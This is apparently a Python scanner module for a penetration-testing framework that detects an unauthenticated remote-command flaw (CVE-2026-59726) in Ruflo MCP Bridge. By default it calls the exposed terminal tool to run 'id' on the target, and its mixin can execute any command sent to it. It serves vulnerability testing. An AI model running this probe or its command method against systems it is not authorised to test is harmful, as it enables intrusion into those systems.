#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Ruflo MCP Bridge unauthenticated terminal RCE (CVE-2026-59726, RufRoot)."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.mcp_jsonrpc import Mcp_jsonrpc

_DEFAULT_MCP_PATH = "/mcp/devtools"
_TERMINAL_TOOL = "ruflo__terminal_execute"


class Ruflo_mcp_bridge(Mcp_jsonrpc):
    """Ruflo MCP bridge protocol (CVE-2026-59726) — mixin for scanner/exploit modules."""

    HEALTH_PATH = "/health"
    SERVICE_NAME = "mcp-bridge"
    TERMINAL_TOOL = _TERMINAL_TOOL

    def ruflo_jsonrpc_path(self) -> str:
        mcp_path = getattr(self, "mcp_path", None)
        if mcp_path is not None:
            suffix = self._mcp_option_value(mcp_path, _DEFAULT_MCP_PATH)
        else:
            suffix = self._mcp_option_value(getattr(self, "mcp_jsonrpc_path", None), _DEFAULT_MCP_PATH)
        base = self._mcp_option_value(getattr(self, "path", None), "/")
        return self.mcp_join_path(base, suffix)

    def ruflo_health(self):
        return self.mcp_get_json(self.HEALTH_PATH, timeout=self.mcp_timeout())

    def ruflo_is_bridge(self, health) -> bool:
        return isinstance(health, dict) and health.get("service") == self.SERVICE_NAME

    def ruflo_tools_list(self) -> list:
        return self.mcp_tools_list(path=self.ruflo_jsonrpc_path())

    def ruflo_terminal_execute(self, command: str, *, rid: int = 2) -> str:
        parsed = self.mcp_call_tool(
            self.TERMINAL_TOOL,
            {"command": command},
            path=self.ruflo_jsonrpc_path(),
            rid=rid,
        )
        return self.mcp_nested_command_output(parsed)


class Module(Scanner, Http_client, Ruflo_mcp_bridge):
    __info__ = {
        "name": "Ruflo MCP Bridge CVE-2026-59726 detect",
        "description": (
            "CVE-2026-59726 (RufRoot): Ruflo MCP Bridge before 3.16.3 exposes "
            "unauthenticated JSON-RPC on /mcp/devtools including ruflo__terminal_execute."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2026-59726",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-59726",
        ],
        "modules": [
            "exploits/linux/http/ruflo_mcp_cve_2026_59726_rce",
        ],
        "tags": [
            "web",
            "scanner",
            "mcp",
            "ruflo",
            "rufroot",
            "rce",
            "unauthenticated",
            "cwe-306",
            "cve-2026-59726",
        ],
        "agent": {
            "risk": "active",
            "effects": ["network_probe"],
            "expected_requests": 3,
            "reversible": True,
            "approval_required": False,
            "produces": ["tech_hints", "risk_signals", "exploit_paths"],
            "requires": {
                "endpoint_pattern_any": ["/mcp/devtools", "/health"],
                "tech_hints_any": ["mcp", "ruflo"],
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "rce", "from_detail": _TERMINAL_TOOL},
                ],
                "suggested_followups": [
                    "exploits/linux/http/ruflo_mcp_cve_2026_59726_rce",
                ],
            },
        },
    }

    port = OptPort(3001, "Ruflo MCP bridge port (default 3001)", True)
    ssl = OptBool(False, "Use HTTPS", True, advanced=True)
    mcp_path = OptString(_DEFAULT_MCP_PATH, "MCP JSON-RPC path", False, advanced=True)
    active_probe = OptBool(
        True,
        "Invoke ruflo__terminal_execute with id (confirms RCE)",
        required=False,
    )

    def run(self):
        print_status(f"Probing Ruflo MCP bridge on port {self.port}...")

        health = self.ruflo_health()
        if not self.ruflo_is_bridge(health):
            print_info("Health endpoint did not identify mcp-bridge")
            return False

        version = str(health.get("version") or "unknown")
        tool_total = (health.get("tools") or {}).get("total")
        print_success(
            f"MCP bridge up (v{version}"
            + (f", {tool_total} tools" if tool_total is not None else "")
            + ")"
        )

        tools = self.ruflo_tools_list()

        if self.TERMINAL_TOOL not in tools:
            print_info(f"tools/list returned {len(tools)} tools; {self.TERMINAL_TOOL} absent")
            if tools:
                self.set_info(
                    severity="medium",
                    cve="CVE-2026-59726",
                    reason=f"MCP bridge exposed {len(tools)} tools without auth (terminal tool missing)",
                    confidence="low",
                    version=version,
                )
                return True
            return False

        print_warning(
            f"Unauthenticated tools/list ({len(tools)} tools); {self.TERMINAL_TOOL} present"
        )

        if not self.active_probe:
            self.set_info(
                severity="critical",
                cve="CVE-2026-59726",
                reason=(
                    f"CWE-306: {self.TERMINAL_TOOL} listed without authentication "
                    f"(Ruflo MCP Bridge < 3.16.3)"
                ),
                confidence="high",
                version=version,
                path=self.ruflo_jsonrpc_path(),
            )
            return True

        output = self.ruflo_terminal_execute("id")
        if "uid=" not in output:
            self.set_info(
                severity="high",
                cve="CVE-2026-59726",
                reason=f"{self.TERMINAL_TOOL} reachable but id probe inconclusive",
                confidence="medium",
                version=version,
            )
            return True

        print_success(f"RCE confirmed: {output.splitlines()[0] if output else output}")
        self.set_info(
            severity="critical",
            cve="CVE-2026-59726",
            reason=f"Unauthenticated RCE via {self.TERMINAL_TOOL}: {output.splitlines()[0]}",
            confidence="high",
            version=version,
            path=self.ruflo_jsonrpc_path(),
        )
        return True
